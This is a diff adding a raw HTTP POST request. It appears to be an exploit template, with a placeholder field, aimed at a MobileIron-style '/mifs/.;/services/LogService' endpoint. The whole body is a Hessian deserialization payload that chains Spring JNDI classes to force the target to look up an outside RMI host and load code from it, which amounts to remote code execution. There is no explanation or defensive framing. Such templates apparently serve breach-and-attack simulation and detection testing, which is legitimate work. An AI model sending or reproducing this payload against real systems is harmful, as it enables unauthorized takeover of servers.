@@ -1,0 +1,9 @@
+POST /page{PICUSID}/mifs/.;/services/LogService HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: x-application/hessian
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 890
+
+c%02%00H%00%04testMt%00%00Mt%00Aorg.springframework.aop.support.DefaultBeanFactoryPointcutAdvisorS%00%0EadviceBeanNameS%00+rmi%3A%2F%2F104.1.22.24%3A1099%2Fpha0epS%00%05orderNS%00%08pointcutMt%00%24org.springframework.aop.TruePointcutzS%00%0BbeanFactoryMt%006org.springframework.jndi.support.SimpleJndiBeanFactoryS%00%0BresourceRefTS%00%12shareableResourcesVt%00%11java.util.HashSetl%00%00%00%01S%00+rmi%3A%2F%2F104.1.22.24%3A1099%2Fpha0epzS%00%10singletonObjectsMt%00%00zS%00%0DresourceTypesMt%00%00zS%00%06loggerMt%00%27org.apache.commons.logging.impl.NoOpLogzS%00%0CjndiTemplateMt%00%25org.springframework.jndi.JndiTemplateS%00%06loggerMt%00%27org.apache.commons.logging.impl.NoOpLogzS%00%0BenvironmentNzzzR%00%00%00%01Mt%00Aorg.springframework.aop.support.DefaultBeanFactoryPointcutAdvisorS%00%0EadviceBeanNameNS%00%05orderNS%00%08pointcutR%00%00%00%02S%00%0BbeanFactoryNzR%00%00%00%0Az
